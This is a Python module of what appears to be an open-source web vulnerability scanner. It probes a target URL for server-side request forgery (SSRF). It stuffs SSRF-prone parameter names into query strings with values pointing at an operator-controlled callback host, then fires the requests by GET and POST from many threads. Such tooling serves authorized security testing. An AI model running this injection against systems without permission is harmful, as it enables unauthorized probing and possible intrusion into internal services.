#!/usr/bin/env python3
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.6#Beta'
from core.libs import post_data,urlencoder
from threading import Thread
from queue import Queue
from urllib.parse import urlparse # url parsing
from wordlists import ssrf_parameters # ssrf parameters wordlist

q = Queue()


parameters_in_one_request = 10

# parameters_in_one_request = 2

# ?ex1=http://google.com&ex2=http://google.com


def threader(host,http,methods):
    while True:
        item = q.get()
        lor(item,host,http,methods)
        q.task_done()

def org(url,host):
    l = len(ssrf_parameters())
    newurl = url
    allu = []
    for par in ssrf_parameters():
        pay = f'{host}/{par}'
        if newurl != url:
            if len(urlparse(newurl).query) > 0:
                newurl += f'&{par}={pay}'
            else:
                newurl += f'?{par}={pay}'
        else:
            if len(urlparse(url).query) > 0:
                newurl += f'&{par}={pay}'
            else:
                newurl += f'?{par}={pay}'
        if len(urlparse(newurl).query.split('=')) == parameters_in_one_request + 1:
            allu.append(newurl)
            newurl = url
    return allu

def lor(url,host,http,methods=['GET','POST']):
    for method in methods:
        if method == 'GET':
            r = http.send(method,url)
        else:
            r = http.send(method,url.split('?')[0],body=urlparse(url).query)

def start(opts,http):
    if opts['host']:
        pass
    else:
        return
    for _ in range(int(opts['threads'])):
        p1 = Thread(target=threader,args=(opts['host'],http,opts['methods']))
        p1.daemon = True
        p1.start()
    for url in org(opts['url'],opts['host']):
        q.put(url)
    q.join()
